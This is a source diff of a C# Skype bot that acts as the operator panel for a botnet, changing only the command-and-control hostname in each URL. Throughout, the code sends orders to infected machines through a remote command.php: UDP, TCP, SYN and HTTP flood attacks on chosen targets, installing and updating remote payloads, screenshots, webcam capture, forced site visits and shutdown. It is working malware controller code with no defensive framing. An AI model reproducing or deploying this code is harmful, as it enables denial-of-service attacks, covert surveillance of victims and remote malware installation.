@@ -52,7 +52,7 @@ namespace sBot
         private static bool login(string user)
         {
             WebClient web = new WebClient();
-            string data = web.DownloadString("http://www.colaska.com/skype/login.php?user=" + user);
+            string data = web.DownloadString("http://www.site.com/skype/login.php?user=" + user);
             if (data != "True")
             {
                 return false;
@@ -76,14 +76,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=message" + "&instruction=MESSAGE:" + message);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to\n" + data;
             }
 
@@ -93,7 +93,7 @@ namespace sBot
         private static string OnlineUsers(string name)
         {
             WebClient DownloadUsers = new WebClient();
-            return DownloadUsers.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+            return DownloadUsers.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
         }
 
         private static string ShutDown(string name)
@@ -102,14 +102,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=shutdown&instruction=SHUTDOWN:True");
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -121,14 +121,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=visit&instruction=VISIT:" + commanda[2]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -140,14 +140,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=INSTALL:" + commanda[2]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -159,14 +159,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=UPDATE:" + commanda[2]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -179,15 +179,15 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 reply = "Sorry Fresh command cannot currently be sent globally";
                 //WebClient web = new WebClient();
-                //string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
-                //data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                //string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=install&instruction=FRESH:True");
+                //data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 //reply = "Command sent to " + data;
             }
             return reply;
@@ -206,14 +206,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=speak&instruction=SPEAK:" + message);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -232,14 +232,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=print&instruction=PRINT:" + message);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -252,14 +252,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=udp&instruction=UDP:" + commanda[2] + ":" + commanda[3]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -272,14 +272,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=tcp&instruction=TCP:" + commanda[2] + ":" + commanda[3]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -292,14 +292,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=syn&instruction=SYN:" + commanda[2] + ":" + commanda[3]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -312,14 +312,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=http&instruction=HTTP:" + commanda[2] + ":" + commanda[3]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -331,14 +331,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=screenshot&instruction=SCREENSHOT:True");
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -350,14 +350,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=webcam&instruction=WEBCAM:True");
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
@@ -369,14 +369,14 @@ namespace sBot
             if (commanda[1] != "global")
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=" + commanda[1] + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
                 reply = "Command sent to " + commanda[1];
             }
             else
             {
                 WebClient web = new WebClient();
-                string data = web.DownloadString("http://www.colaska.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
-                data = web.DownloadString("http://www.colaska.com/skype/" + name + "/online.txt");
+                string data = web.DownloadString("http://www.site.com/skype/command.php?name=global" + "&user=" + EncodeTo64(name) + "&command=beep&instruction=BEEP:" + commanda[2] + ":" + commanda[3]);
+                data = web.DownloadString("http://www.site.com/skype/" + name + "/online.txt");
                 reply = "Command sent to " + data;
             }
             return reply;
